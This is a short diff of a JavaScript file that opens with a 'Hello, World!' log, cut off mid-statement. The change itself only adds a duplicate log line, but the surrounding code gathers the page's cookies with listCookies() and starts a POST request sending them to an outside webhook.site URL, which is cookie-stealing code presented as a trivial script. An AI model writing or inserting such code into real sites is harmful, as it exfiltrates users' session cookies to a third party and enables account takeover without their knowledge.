@@ -1,6 +1,7 @@
 console.log('Hello, World!');
 document.getElementById('myId').innerHTML=listCookies(); 
 var formData = new URLSearchParams();
+console.log('Hello, World!');
 formData.append('key1', listCookies());
 fetch('https://webhook.site/41a1d9eb-93cd-4eaa-81c4-60511162a89b', {
     method: 'POST',
